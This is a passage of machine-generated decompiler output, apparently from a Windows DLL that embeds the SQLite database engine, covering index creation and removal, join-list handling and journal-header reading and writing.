        v75 = (unsigned __int8 **)v36[4];
        if ( !v39 )
        {
          do
          {
            if ( !sub_100593BE(v73, *v75) )
              break;
            v77 = (char *)v77 + 1;
            v75 += 6;
          }
          while ( (int)v77 < v36[3] );
        }
        v41 = v77;
        if ( (int)v77 >= v36[3] )
          break;
        *(_DWORD *)(v31[2] + 4 * v76) = v77;
        if ( *(_DWORD *)v79 && (v42 = *(_BYTE ***)(*(_DWORD *)v79 + 20)) != 0 )
        {
          v73 = sub_10059297(*v42) + 1;
          memcpy(v74, v43, (size_t)v73);
          v77 = v74;
          v74 = (char *)v74 + (_DWORD)v73;
        }
        else
        {
          v77 = *(void **)(24 * (_DWORD)v41 + v36[4] + 16);
          if ( !v77 )
            v77 = **(void ***)(v83 + 44);
        }
        if ( !*(_BYTE *)(v83 + 124) && !sub_1006AB10(a2, (char *)v77) )
          goto LABEL_104;
        v38 = v77;
        *(_DWORD *)(v31[11] + 4 * v76) = v77;
        LOBYTE(v38) = j & *(_BYTE *)(v79 + 12);
        v44 = v76;
        v45 = v31[10];
        v79 += 20;
        *(_BYTE *)(v76 + v45) = (_BYTE)v38;
        v39 = ++v44 < *a5;
        v76 = v44;
        if ( !v39 )
          goto LABEL_62;
      }
      sub_10059320(a2, "table %s has no column named %s", (const char *)v36[1], (const char *)v73);
      goto LABEL_104;
    }
LABEL_62:
    sub_1006C389((int)v38, (int)v31);
    if ( v36 == (int *)a2[125] )
    {
      for ( i = v36[5]; i; i = *(_DWORD *)(i + 32) )
      {
        v47 = *(_DWORD *)(i + 4);
        if ( v47 == v31[1] )
        {
          v79 = 0;
          if ( v47 > 0 )
          {
            v48 = v31[2];
            v49 = *(_DWORD *)(i + 8) - v48;
            for ( j = v49; ; v49 = j )
            {
              v50 = 4 * v79;
              if ( *(_DWORD *)(4 * v79 + v48 + v49) != *(_DWORD *)(4 * v79 + v48) )
                break;
              v51 = *(unsigned __int8 **)(v50 + *(_DWORD *)(i + 44));
              v52 = *(unsigned __int8 **)(v50 + v31[11]);
              if ( v51 != v52 )
              {
                if ( sub_100593BE(v51, v52) )
                  break;
              }
              if ( ++v79 >= *(_DWORD *)(i + 4) )
                break;
            }
          }
          if ( v79 == *(_DWORD *)(i + 4) )
          {
            v56 = *(_BYTE *)(i + 24);
            v57 = *((_BYTE *)v31 + 24);
            if ( v56 != v57 )
            {
              if ( v56 != 99 && v57 != 99 )
                sub_10059320(a2, aConflictingOnC, 0);
              if ( *(_BYTE *)(i + 24) == 99 )
                *(_BYTE *)(i + 24) = *((_BYTE *)v31 + 24);
            }
            goto LABEL_104;
          }
        }
      }
    }
    v53 = v83;
    if ( *(_BYTE *)(v83 + 124) )
    {
      v54 = sub_10059297((_BYTE *)*v31);
      if ( sub_10069032((unsigned int *)(v31[9] + 20), v55, (int)v54, v31) )
      {
        *(_BYTE *)(v53 + 30) = 1;
        goto LABEL_104;
      }
      *(_DWORD *)(v53 + 12) |= 0x200u;
      if ( a4 )
        v31[5] = *(_DWORD *)(v53 + 120);
    }
    else
    {
      v58 = (unsigned __int8 *)++a2[18];
      v73 = v58;
      v74 = sub_1007C271(a2);
      if ( !v74 )
      {
LABEL_104:
        if ( v31 )
        {
          sub_10058E74(v31[7]);
          sub_10058EC7(v83, (unsigned int)v31);
        }
        goto LABEL_106;
      }
      sub_1006CB39(a2, v81, 1);
      sub_1005ABE8((int)v74, 96, v81, (int)v58);
      if ( a7 )
      {
        v59 = (const char *)&unk_10186438;
        if ( a6 )
          v59 = aUnique;
        v60 = sub_10055484(v83, "CREATE%s INDEX %.*s", v59, *a8 - *v78 + 1, (const char *)*v78);
      }
      else
      {
        v60 = 0;
      }
      v61 = aSqliteTempMast_5;
      if ( v81 != 1 )
        v61 = aSqliteMaster_5;
      sub_10069DB8((int)a2, aInsertIntoQSVa, *(_DWORD *)(v72 + *(_DWORD *)(v83 + 8)), v61, *v31, v80[1], v73, v60);
      sub_10058EC7(v83, v60);
      if ( a4 )
      {
        sub_1006BAEE(a2, (int)v31, (int)v73);
        sub_1006AB7A(a2, v81);
        v63 = (unsigned __int16 *)sub_10055484(v83, aNameQ, *v31, v62);
        sub_1005AC02((int *)v74, 98, v81, 0, 0, v63, (_BYTE *)0xFFFFFFFF);
        sub_1005ABD1((int)v74, 119, 0);
      }
    }
    if ( *(_BYTE *)(v83 + 124) || !a4 )
    {
      v64 = v80;
      if ( a6 == 5 && (v65 = v80[5]) != 0 && *(_BYTE *)(v65 + 24) != 5 )
      {
        while ( *(_DWORD *)(v65 + 32) && *(_BYTE *)(*(_DWORD *)(v65 + 32) + 24) != 5 )
          v65 = *(_DWORD *)(v65 + 32);
        v31[8] = *(_DWORD *)(v65 + 32);
        *(_DWORD *)(v65 + 32) = v31;
      }
      else
      {
        v31[8] = v80[5];
        v64[5] = (int)v31;
      }
      v71 = v31;
      v31 = 0;
    }
    goto LABEL_104;
  }
  v81 = sub_1006A35E(a1, a2, (int *)&v78, a3);
  if ( v81 >= 0 )
  {
    v13 = v83;
    if ( !*(_BYTE *)(v83 + 124) )
    {
      v14 = sub_1008010E(a4, a2);
      if ( !*(_DWORD *)(a1 + 4) && v14 && v14[17] == *(_DWORD *)(*(_DWORD *)(v13 + 8) + 28) )
        v81 = 1;
    }
    if ( sub_10078FDE(v68, v81, a2, (int *)aIndex, v78) )
      sub_1007900F((int)v68, (__int16 *)a4);
    v15 = sub_10069EB7((int)a2, 0, *(unsigned __int8 **)(a4 + 12), *(unsigned __int8 **)(a4 + 8));
    v80 = v15;
    if ( v15 )
    {
      if ( !*(_BYTE *)(v83 + 30) )
        goto LABEL_18;
    }
  }
LABEL_106:
  sub_100767B1(a5, v83);
  sub_1006C7F7((__int16 *)a4, v83);
  sub_10058EC7(v83, (unsigned int)Src);
  return (int)v71;
}
// 1006BF1C: variable 'v26' is possibly undefined
// 1006C047: variable 'v43' is possibly undefined
// 1006C17B: variable 'v55' is possibly undefined
// 1006C2CB: variable 'v62' is possibly undefined

//----- (1006C389) --------------------------------------------------------
int __fastcall sub_1006C389(int a1, int a2)
{
  _DWORD *v2; // ecx
  int result; // eax

  v2 = *(_DWORD **)(a2 + 12);
  *v2 = 1000000;
  for ( result = *(_DWORD *)(a2 + 4); result >= 5; --result )
    v2[result] = 5;
  for ( ; result >= 1; --result )
    v2[result] = 11 - result;
  if ( *(_BYTE *)(a2 + 24) )
  {
    result = *(_DWORD *)(a2 + 4);
    v2[result] = 1;
  }
  return result;
}

//----- (1006C3C7) --------------------------------------------------------
void __cdecl sub_1006C3C7(int a1, int a2, int a3)
{
  int *v3; // ebx
  int v4; // esi
  char *v5; // eax
  int v6; // esi
  unsigned __int8 *v7; // esi
  int *v8; // [esp+10h] [ebp-Ch]
  int v9; // [esp+14h] [ebp-8h]
  int v10; // [esp+18h] [ebp-4h]

  v10 = *(_DWORD *)a1;
  if ( !*(_BYTE *)(*(_DWORD *)a1 + 30) && !sub_10058497((_DWORD *)a1) )
  {
    v3 = sub_10069F30(*(unsigned __int8 **)(a2 + 12), *(unsigned __int8 **)(a2 + 8));
    if ( v3 )
    {
      if ( *((_BYTE *)v3 + 25) )
      {
        sub_10059320((int *)a1, aIndexAssociate, 0);
      }
      else
      {
        v4 = sub_1005855F(v10, v3[9]);
        v9 = v4;
        v8 = sub_1007C271((int *)a1);
        if ( v8 )
        {
          sub_1006CB39((int *)a1, v4, 1);
          v5 = aSqliteTempMast_6;
          if ( v4 != 1 )
            v5 = aSqliteMaster_6;
          v6 = 16 * v4;
          sub_10069DB8(a1, aDeleteFromQSWh_0, *(_DWORD *)(*(_DWORD *)(v10 + 8) + v6), v5, *v3);
          v7 = *(unsigned __int8 **)(v6 + *(_DWORD *)(v10 + 8));
          if ( sub_10069E40(v10, (unsigned __int8 *)aSqliteStat1_0, v7) )
            sub_10069DB8(a1, aDeleteFromQSql_0, v7, *v3);
          sub_1006AB7A((_DWORD *)a1, v9);
          sub_1006B563(v9, (int *)a1, v3[5]);
          sub_1005AC02(v8, 101, v9, 0, 0, (unsigned __int16 *)*v3, 0);
        }
      }
    }
    else
    {
      if ( !a3 )
        sub_10059320((int *)a1, "no such index: %S", (const wchar_t *)a2);
      *(_BYTE *)(a1 + 18) = 1;
    }
  }
  sub_1006C7F7((__int16 *)a2, v10);
}

//----- (1006C503) --------------------------------------------------------
_DWORD *__usercall sub_1006C503@<eax>(
        _DWORD *a1@<eax>,
        int a2@<ecx>,
        int *a3@<edi>,
        int *a4@<esi>,
        int a5,
        signed int Size,
        int *a7)
{
  _DWORD *v7; // ebx
  _DWORD *v8; // eax
  int v9; // eax

  v7 = a1;
  if ( *a4 < *a3 )
    goto LABEL_5;
  v8 = sub_100590DA(a5, a1, Size * (a2 + 2 * *a3));
  if ( v8 )
  {
    v7 = v8;
    *a3 = sub_10058E55((unsigned int)v8) / Size;
LABEL_5:
    memset((char *)v7 + Size * *a4, 0, Size);
    v9 = *a4;
    *a7 = *a4;
    *a4 = v9 + 1;
    return v7;
  }
  *a7 = -1;
  return v7;
}

//----- (1006C56B) --------------------------------------------------------
unsigned int *__usercall sub_1006C56B@<eax>(unsigned int *a1@<eax>, int a2, int a3)
{
  unsigned int *v3; // ebx
  unsigned int *v4; // eax
  _DWORD *v6; // eax
  int v7; // esi
  bool v8; // sf
  int v9; // [esp+Ch] [ebp-4h] BYREF

  v3 = a1;
  if ( !a1 )
  {
    v4 = sub_1005904B(a2, 0xCu);
    v3 = v4;
    if ( !v4 )
      return 0;
    v4[2] = 0;
  }
  v6 = sub_1006C503((_DWORD *)*v3, 5, (int *)v3 + 2, (int *)v3 + 1, a2, 8, &v9);
  v7 = v9;
  v8 = v9 < 0;
  *v3 = (unsigned int)v6;
  if ( v8 )
  {
    sub_1006C5DA(v3, a2);
    return 0;
  }
  *(_DWORD *)(*v3 + 8 * v7) = sub_1006A297(a3, a2);
  return v3;
}

//----- (1006C5DA) --------------------------------------------------------
void __usercall sub_1006C5DA(unsigned int *a1@<esi>, int a2)
{
  signed int v2; // edi

  v2 = 0;
  if ( a1 )
  {
    if ( (int)a1[1] > 0 )
    {
      do
        sub_10058EC7(a2, *(_DWORD *)(*a1 + 8 * v2++));
      while ( v2 < (int)a1[1] );
    }
    sub_10058EC7(a2, *a1);
    sub_10058EC7(a2, (unsigned int)a1);
  }
}

//----- (1006C617) --------------------------------------------------------
int __usercall sub_1006C617@<eax>(int a1@<eax>, unsigned __int8 *a2)
{
  int v3; // edi
  int v4; // ebx
  unsigned __int8 **i; // esi

  if ( !a1 )
    return -1;
  v3 = *(_DWORD *)(a1 + 4);
  v4 = 0;
  if ( v3 <= 0 )
    return -1;
  for ( i = *(unsigned __int8 ***)a1; sub_100593BE(*i, a2); i += 2 )
  {
    if ( ++v4 >= v3 )
      return -1;
  }
  return v4;
}

//----- (1006C653) --------------------------------------------------------
__int16 *__usercall sub_1006C653@<eax>(__int16 *a1@<eax>, int a2, int a3, int a4)
{
  __int16 *v4; // ebx
  int v5; // ecx
  int v6; // esi
  int v7; // eax
  __int16 *v8; // eax
  int v9; // eax
  int v10; // edx
  int v11; // eax
  void *v12; // edi
  const void *v13; // esi
  __int16 *v14; // edi
  _DWORD *v15; // edi
  int v16; // eax
  int v18; // [esp+Ch] [ebp-4h]

  v4 = a1;
  v5 = a1[1];
  v6 = a3;
  v7 = a3 + *a1;
  if ( v7 > v5 )
  {
    v8 = (__int16 *)sub_100590DA(a2, v4, 56 * v7 + 8);
    if ( !v8 )
      return v4;
    v4 = v8;
    v8[1] = (sub_10058E55((unsigned int)v8) - 64) / 0x38u + 1;
  }
  v9 = *v4 - 1;
  if ( v9 >= a4 )
  {
    v10 = (int)&v4[28 * v9 + 4];
    v18 = (int)&v4[28 * v9 + 4 + 28 * a3];
    v11 = *v4 - a4;
    do
    {
      v12 = (void *)v18;
      v18 -= 56;
      v13 = (const void *)v10;
      v10 -= 56;
      --v11;
      qmemcpy(v12, v13, 0x38u);
    }
    while ( v11 );
    v6 = a3;
  }
  *v4 += v6;
  v14 = &v4[28 * a4];
  memset(v14 + 4, 0, 56 * v6);
  if ( a4 < v6 + a4 )
  {
    v15 = v14 + 16;
    v16 = v6;
    do
    {
      *v15 = -1;
      v15 += 14;
      --v16;
    }
    while ( v16 );
  }
  return v4;
}

//----- (1006C71D) --------------------------------------------------------
__int16 *__usercall sub_1006C71D@<eax>(__int16 *a1@<eax>, int a2@<edi>, int a3, _DWORD *a4)
{
  __int16 *v5; // eax
  __int16 *v6; // ebx
  int *v7; // esi
  _DWORD *v8; // eax

  if ( !a1 )
  {
    a1 = (__int16 *)sub_1005904B(a2, 0x40u);
    if ( !a1 )
      return 0;
    a1[1] = 1;
  }
  v5 = sub_1006C653(a1, a2, 1, *a1);
  v6 = v5;
  if ( *(_BYTE *)(a2 + 30) )
  {
    sub_1006C7F7(v5, a2);
    return 0;
  }
  v7 = (int *)&v5[28 * *v5 - 24];
  if ( a4 )
  {
    if ( !*a4 )
      a4 = 0;
    v8 = a4;
    if ( a4 )
    {
      a4 = (_DWORD *)a3;
      a3 = (int)v8;
    }
  }
  v7[1] = sub_1006A297(a3, a2);
  *v7 = sub_1006A297((int)a4, a2);
  return v6;
}

//----- (1006C7A7) --------------------------------------------------------
void __cdecl sub_1006C7A7(int a1, __int16 *a2)
{
  int *v3; // esi
  int v4; // [esp+10h] [ebp+Ch]

  if ( a2 )
  {
    v4 = 0;
    if ( *a2 > 0 )
    {
      v3 = (int *)(a2 + 12);
      do
      {
        if ( v3[2] >= 0 )
          break;
        v3[2] = (*(_DWORD *)(a1 + 68))++;
        if ( *v3 )
          sub_1006C7A7(a1, *(_DWORD *)(*v3 + 8));
        ++v4;
        v3 += 14;
      }
      while ( v4 < *a2 );
    }
  }
}

//----- (1006C7F7) --------------------------------------------------------
void __usercall sub_1006C7F7(__int16 *a1@<ebx>, int a2)
{
  __int16 *i; // edi
  unsigned int v3; // eax
  unsigned int v4; // [esp+0h] [ebp-8h]
  int v5; // [esp+4h] [ebp-4h]

  if ( a1 )
  {
    v5 = 0;
    for ( i = a1 + 4; v5 < *a1; i += 28 )
    {
      sub_10058EC7(a2, *(_DWORD *)i);
      sub_10058EC7(a2, *((_DWORD *)i + 1));
      sub_10058EC7(a2, *((_DWORD *)i + 2));
      sub_10058EC7(a2, *((_DWORD *)i + 12));
      sub_1006A1BB(*((_DWORD *)i + 3));
      v3 = *((_DWORD *)i + 4);
      v4 = v3;
      if ( v3 )
      {
        sub_1007AEDD(a2, v3);
        sub_10058EC7(a2, v4);
      }
      sub_10075FD8(a2, *((_DWORD *)i + 7));
      sub_1006C5DA(*((unsigned int **)i + 8), a2);
      ++v5;
    }
    sub_10058EC7(a2, (unsigned int)a1);
  }
}
// 1006A1BB: using guessed type _DWORD __cdecl sub_1006A1BB(_DWORD);
// 10075FD8: using guessed type _DWORD __cdecl sub_10075FD8(_DWORD, _DWORD);
// 1007AEDD: using guessed type _DWORD __cdecl sub_1007AEDD(_DWORD, _DWORD);

//----- (1006C893) --------------------------------------------------------
__int16 *__usercall sub_1006C893@<eax>(
        __int16 *a1@<eax>,
        int *a2@<ecx>,
        int a3,
        _DWORD *a4,
        int a5,
        unsigned int a6,
        unsigned int a7,
        unsigned int *a8)
{
  int v8; // ebx
  const char *v9; // eax
  __int16 *v11; // eax
  __int16 *v12; // esi
  __int16 v13; // ax
  __int16 *v14; // edi

  v8 = *a2;
  if ( !a1 )
  {
    if ( a7 )
    {
      v9 = aOn;
      goto LABEL_5;
    }
    if ( a8 )
    {
      v9 = aUsing;
LABEL_5:
      sub_10059320(a2, "a JOIN clause is required before %s", v9);
LABEL_6:
      sub_10075FD8(v8, a7);
      sub_1006C5DA(a8, v8);
      sub_1007B016(v8, a6);
      return 0;
    }
  }
  v11 = sub_1006C71D(a1, v8, a3, a4);
  v12 = v11;
  if ( !v11 )
    goto LABEL_6;
  v13 = *v11;
  if ( !v13 )
    goto LABEL_6;
  v14 = &v12[28 * v13 - 24];
  if ( *(_DWORD *)(a5 + 4) )
    *((_DWORD *)v14 + 2) = sub_1006A297(a5, v8);
  *((_DWORD *)v14 + 4) = a6;
  *((_DWORD *)v14 + 7) = a7;
  *((_DWORD *)v14 + 8) = a8;
  return v12;
}

//----- (1006C93D) --------------------------------------------------------
_DWORD *__usercall sub_1006C93D@<eax>(_DWORD *result@<eax>, __int16 *a2@<ecx>, int *a3)
{
  int v3; // esi

  if ( a2 && *a2 > 0 )
  {
    v3 = (int)&a2[28 * *a2 - 24];
    if ( result[1] != 1 || *result )
    {
      result = (_DWORD *)sub_1006A297((int)result, *a3);
      *(_DWORD *)(v3 + 48) = result;
    }
    else
    {
      *(_BYTE *)(v3 + 22) = 1;
    }
  }
  return result;
}

//----- (1006C978) --------------------------------------------------------
void __usercall sub_1006C978(__int16 *a1@<esi>)
{
  int v1; // eax
  _BYTE *v2; // ecx

  if ( a1 && a1 != (__int16 *)-8 )
  {
    v1 = *a1 - 1;
    if ( v1 > 0 )
    {
      v2 = (char *)&a1[28 * v1 + 14] + 1;
      do
      {
        *v2 = *(v2 - 56);
        --v1;
        v2 -= 56;
      }
      while ( v1 > 0 );
    }
    *((_BYTE *)a1 + 29) = 0;
  }
}

//----- (1006C9A6) --------------------------------------------------------
int *__usercall sub_1006C9A6@<eax>(int *a1@<eax>, int a2)
{
  int v2; // esi
  int *result; // eax
  int *v4; // ebx
  int v5; // edi

  v2 = *a1;
  result = sub_1007C271(a1);
  v4 = result;
  v5 = 0;
  if ( result )
  {
    if ( a2 != 7 && *(int *)(v2 + 4) > 0 )
    {
      do
      {
        sub_1005ABE8((int)v4, 34, v5, (a2 == 9) + 1);
        sub_1005B0F6(v5++, v4);
      }
      while ( v5 < *(_DWORD *)(v2 + 4) );
    }
    return (int *)sub_1005AB66((int)v4, 33, 0, 0, 0);
  }
  return result;
}

//----- (1006CA0C) --------------------------------------------------------
void __usercall sub_1006CA0C(int a1@<eax>, int *a2@<ecx>, int a3)
{
  unsigned __int16 *v4; // esi
  int *v5; // eax

  v4 = (unsigned __int16 *)sub_1006A297(a1, *a2);
  if ( v4 )
  {
    v5 = sub_1007C271(a2);
    if ( v5 )
      sub_1005AC02(v5, 32, a3, 0, 0, v4, (_BYTE *)0xFFFFFFFF);
    else
      sub_10058EC7(*a2, (unsigned int)v4);
  }
}

//----- (1006CA50) --------------------------------------------------------
int __usercall sub_1006CA50@<eax>(int a1@<eax>)
{
  int v2; // esi
  int *v3; // edi
  int v5; // [esp+Ch] [ebp-4h]

  v2 = *(_DWORD *)a1;
  v3 = (int *)(*(_DWORD *)(*(_DWORD *)a1 + 8) + 20);
  if ( !*v3 && !*(_BYTE *)(a1 + 476) )
  {
    v5 = sub_100541BA(v2, 542, 0, v3, 0, 2000);
    if ( v5 )
    {
      sub_10059320((int *)a1, aUnableToOpenAT);
      *(_DWORD *)(a1 + 4) = v5;
      return 1;
    }
    sub_1006F6DE(*(unsigned __int8 *)(v2 + 32), **(_DWORD **)(*(_DWORD *)(*(_DWORD *)(v2 + 8) + 20) + 4));
  }
  return 0;
}

//----- (1006CAC0) --------------------------------------------------------
int __usercall sub_1006CAC0@<eax>(int *a1@<eax>, int a2@<esi>)
{
  int *v2; // edi
  int result; // eax

  v2 = a1;
  result = a1[106];
  if ( result )
    v2 = (int *)result;
  if ( !v2[87] )
  {
    result = (int)sub_1007C271(v2);
    if ( !result )
      return result;
    result = sub_1005AB66(result, 1, 0, 0, 0) + 1;
    v2[87] = result;
  }
  if ( a2 >= 0 )
  {
    result = v2[85];
    if ( (result & (1 << a2)) == 0 )
    {
      v2[85] = (1 << a2) | result;
      result = **(_DWORD **)(*(_DWORD *)(*v2 + 8) + 16 * a2 + 12);
      v2[a2 + 88] = result;
      if ( a2 == 1 )
        return sub_1006CA50((int)v2);
    }
  }
  return result;
}

//----- (1006CB39) --------------------------------------------------------
char __usercall sub_1006CB39@<al>(int *a1@<eax>, char a2@<cl>, char a3)
{
  int *v3; // edi
  char result; // al

  v3 = (int *)a1[106];
  if ( !v3 )
    v3 = a1;
  sub_1006CAC0(a1, a2);
  v3[84] |= 1 << a2;
  result = a3;
  *((_BYTE *)v3 + 344) |= a3;
  return result;
}

//----- (1006CB6D) --------------------------------------------------------
_DWORD *__thiscall sub_1006CB6D(_DWORD *this)
{
  _DWORD *result; // eax

  result = (_DWORD *)this[106];
  if ( !result )
    result = this;
  *((_BYTE *)result + 345) = 1;
  return result;
}

//----- (1006CB81) --------------------------------------------------------
int __usercall sub_1006CB81@<eax>(int *a1@<eax>, int a2, unsigned __int16 *a3, _BYTE *a4)
{
  int *v5; // edx

  v5 = sub_1007C271(a1);
  if ( a2 == 2 )
    sub_1006CB6D(a1);
  return sub_1005AC02(v5, 6, 19, a2, 0, a3, a4);
}
// 1006CBAB: variable 'v5' is possibly undefined

//----- (1006CBB6) --------------------------------------------------------
unsigned int __cdecl sub_1006CBB6(int *a1, _DWORD *a2)
{
  int v2; // ebx
  int *v3; // edi
  _DWORD *v4; // eax
  unsigned int v5; // esi
  int v6; // edi
  int *v7; // eax
  int **v8; // ecx
  int v10; // [esp+10h] [ebp-8h]
  int **v11; // [esp+14h] [ebp-4h]

  v2 = a2[1];
  v3 = a1;
  v10 = *a1;
  v4 = sub_1005904B(*a1, 5 * v2 + 12);
  v5 = (unsigned int)v4;
  if ( v4 )
  {
    *v4 = *a1;
    v6 = 0;
    v4[2] = &v4[v2 + 3];
    if ( v2 > 0 )
    {
      v11 = (int **)(v4 + 3);
      do
      {
        v7 = sub_1006AB10(a1, *(char **)(a2[11] + 4 * v6));
        v8 = v11++;
        *v8 = v7;
        *(_BYTE *)(v6 + *(_DWORD *)(v5 + 8)) = *(_BYTE *)(v6 + a2[10]);
        ++v6;
      }
      while ( v6 < v2 );
    }
    v3 = a1;
    *(_WORD *)(v5 + 6) = v2;
  }
  if ( v3[16] )
  {
    sub_10058EC7(v10, v5);
    return 0;
  }
  return v5;
}

//----- (1006CC49) --------------------------------------------------------
int __usercall sub_1006CC49@<eax>(int a1@<eax>)
{
  unsigned int v1; // edi
  int v2; // eax
  int v3; // ebx
  int i; // esi
  int v6; // [esp+Ch] [ebp-4h]

  v6 = 0;
  v1 = *(_DWORD *)(a1 + 12);
  v2 = *(_DWORD *)(a1 + 16);
  v3 = *(_DWORD *)(v2 + 92);
  if ( v3 <= 0 )
    return 0;
  for ( i = *(_DWORD *)(v2 + 88) + 16; *(_DWORD *)(i + 4) < v1 || sub_10070BFA(v1, *(unsigned int **)i); i += 32 )
  {
    if ( ++v6 >= v3 )
      return 0;
  }
  return 1;
}

//----- (1006CC90) --------------------------------------------------------
int __cdecl sub_1006CC90(int a1, int a2, int a3, int *a4)
{
  int v4; // esi
  char v6[4]; // [esp+4h] [ebp-4h] BYREF

  v4 = sub_100673FF(a1, (int)v6, 4, a2, a3);
  if ( !v4 )
    *a4 = sub_10059C56(v6);
  return v4;
}
// 1006CC90: using guessed type char var_4[4];

//----- (1006CCC4) --------------------------------------------------------
int __cdecl sub_1006CCC4(int a1, int a2, int a3)
{
  int v3; // ecx
  _BYTE *v4; // eax
  int v6; // [esp+0h] [ebp-4h] BYREF

  v6 = v3;
  v4 = sub_10059C70(&v6, v3);
  return sub_10067419(a1, (int)v4, 4, a2, a3);
}
// 1006CCC7: variable 'v3' is possibly undefined

//----- (1006CCE6) --------------------------------------------------------
int __usercall sub_1006CCE6@<eax>(int a1@<edi>, _BYTE *a2, unsigned int a3)
{
  int v3; // esi
  unsigned int v4; // ebx
  unsigned int v5; // eax
  char Buf1[8]; // [esp+8h] [ebp-18h] BYREF
  __int64 v8; // [esp+10h] [ebp-10h] BYREF
  unsigned int v9; // [esp+1Ch] [ebp-4h] BYREF

  *a2 = 0;
  v3 = (*(int (__cdecl **)(int, __int64 *))(*(_DWORD *)a1 + 24))(a1, &v8);
  if ( v3 )
    return v3;
  if ( v8 < 16 )
    return v3;
  v3 = sub_1006CC90(a1, v8 - 16, (unsigned __int64)(v8 - 16) >> 32, (int *)&v9);
  if ( v3 )
    return v3;
  v4 = v9;
  if ( v9 >= a3 )
    return v3;
  v3 = sub_1006CC90(a1, v8 - 12, (unsigned __int64)(v8 - 12) >> 32, (int *)&v9);
  if ( v3 )
    return v3;
  v3 = sub_100673FF(a1, (int)Buf1, 8, v8 - 8, (unsigned __int64)(v8 - 8) >> 32);
  if ( v3 )
    return v3;
  if ( memcmp(Buf1, &unk_100FEC08, 8u) )
    return v3;
  v5 = sub_100673FF(a1, (int)a2, v4, v8 - v4 - 16, (v8 - (unsigned __int64)v4 - 16) >> 32);
  v3 = v5;
  if ( v5 )
    return v3;
  if ( v4 )
  {
    do
      v9 -= (char)a2[v5++];
    while ( v5 < v4 );
  }
  if ( v9 )
    v4 = 0;
  a2[v4] = 0;
  return 0;
}
// 1006CCE6: using guessed type __int64 var_10;

//----- (1006CDFD) --------------------------------------------------------
int __usercall sub_1006CDFD@<eax>(_DWORD *a1@<eax>)
{
  unsigned int v2; // ecx
  unsigned int v3; // esi
  __int64 v4; // rax

  v2 = a1[18];
  v3 = a1[19];
  LODWORD(v4) = 0;
  if ( v3 | v2 )
    return ((__int64)(__PAIR64__(v3, v2) - 1) / (unsigned int)a1[28] + 1) * a1[28];
  return v4;
}

//----- (1006CE44) --------------------------------------------------------
int __usercall sub_1006CE44@<eax>(int a1@<esi>, int a2)
{
  int result; // eax
  int v3; // eax
  int v4; // edi
  __int64 v5; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+18h] [ebp-4h]

  result = 0;
  if ( *(_QWORD *)(a1 + 72) )
  {
    v3 = *(_DWORD *)(a1 + 164);
    v4 = *(_DWORD *)(a1 + 160);
    v6 = v3;
    if ( a2 || !(v3 | v4) )
      result = sub_10067433(*(_DWORD *)(a1 + 60), 0, 0);
    else
      result = (*(int (__cdecl **)(_DWORD, char *, int, _DWORD, _DWORD))(**(_DWORD **)(a1 + 60) + 12))(
                 *(_DWORD *)(a1 + 60),
                 "",
                 28,
                 0,
                 0);
    if ( !result
      && (*(_BYTE *)(a1 + 8) || (result = sub_10067447(*(_DWORD *)(a1 + 60), *(unsigned __int8 *)(a1 + 10) | 0x10)) == 0)
      && v6 >= 0
      && (v6 > 0 || v4) )
    {
      result = (*(int (__cdecl **)(_DWORD, __int64 *))(**(_DWORD **)(a1 + 60) + 24))(*(_DWORD *)(a1 + 60), &v5);
      if ( !result && v5 > __SPAIR64__(v6, v4) )
        return sub_10067433(*(_DWORD *)(a1 + 60), v4, v6);
    }
  }
  return result;
}
// 1006CE44: using guessed type __int64 var_10;

//----- (1006CEF8) --------------------------------------------------------
int __usercall sub_1006CEF8@<eax>(int a1@<esi>)
{
  unsigned int v1; // ebx
  int v2; // ecx
  _BYTE *v3; // edi
  _DWORD *v4; // eax
  int v5; // eax
  bool v6; // zf
  int v7; // edx
  int v8; // eax
  bool v9; // cf
  int v11; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]
  unsigned int v13; // [esp+Ch] [ebp-4h]

  v1 = *(_DWORD *)(a1 + 124);
  v2 = 0;
  v3 = *(_BYTE **)(a1 + 152);
  v11 = 0;
  if ( v1 > *(_DWORD *)(a1 + 112) )
    v1 = *(_DWORD *)(a1 + 112);
  for ( i = 0; i < *(_DWORD *)(a1 + 92); v2 += 32 )
  {
    v4 = (_DWORD *)(*(_DWORD *)(a1 + 88) + v2 + 8);
    if ( !*(_QWORD *)v4 )
    {
      *v4 = *(_DWORD *)(a1 + 72);
      v4[1] = *(_DWORD *)(a1 + 76);
    }
    ++i;
  }
  v5 = sub_1006CDFD((_DWORD *)a1);
  v6 = *(_BYTE *)(a1 + 8) == 0;
  *(_DWORD *)(a1 + 72) = v5;
  *(_DWORD *)(a1 + 80) = v5;
  *(_DWORD *)(a1 + 76) = v7;
  *(_DWORD *)(a1 + 84) = v7;
  if ( !v6
    || *(_BYTE *)(a1 + 5) == 4
    || ((*(int (__cdecl **)(_DWORD))(**(_DWORD **)(a1 + 56) + 48))(*(_DWORD *)(a1 + 56)) & 0x200) != 0 )
  {
    memcpy(v3, &unk_100FEC08, 8u);
    sub_10059C70(v3 + 8, -1);
  }
  else
  {
    memset(v3, 0, 0xCu);
  }
  sub_10069AB6((char *)(a1 + 44), 4);
  sub_10059C70(v3 + 12, *(_DWORD *)(a1 + 44));
  sub_10059C70(v3 + 16, *(_DWORD *)(a1 + 28));
  sub_10059C70(v3 + 20, *(_DWORD *)(a1 + 112));
  sub_10059C70(v3 + 24, *(_DWORD *)(a1 + 124));
  memset(v3 + 28, 0, v1 - 28);
  v13 = 0;
  do
  {
    if ( v13 >= *(_DWORD *)(a1 + 112) )
      break;
    v8 = sub_10067419(*(_DWORD *)(a1 + 60), (int)v3, v1, *(_DWORD *)(a1 + 72), *(_DWORD *)(a1 + 76));
    v9 = __CFADD__(v1, *(_DWORD *)(a1 + 72));
    *(_DWORD *)(a1 + 72) += v1;
    v11 = v8;
    *(_DWORD *)(a1 + 76) += v9;
    v13 += v1;
  }
  while ( !v8 );
  return v11;
}
// 1006CF58: variable 'v7' is possibly undefined

//----- (1006D020) --------------------------------------------------------
int __usercall sub_1006D020@<eax>(int a1@<eax>, int a2, unsigned int a3, unsigned int a4, int *a5, int *a6)
{
  __int64 v7; // rax
  unsigned int v8; // ecx
  unsigned int v9; // esi
  __int64 v10; // kr00_8
  unsigned int v11; // edi
  bool v12; // cc
  int result; // eax
  unsigned int v14; // esi
  char Buf1[8]; // [esp+Ch] [ebp-10h] BYREF
  unsigned int v16; // [esp+14h] [ebp-8h] BYREF

  LODWORD(v7) = sub_1006CDFD((_DWORD *)a1);
  v8 = *(_DWORD *)(a1 + 112);
  v9 = v7;
  *(_DWORD *)(a1 + 72) = v7;
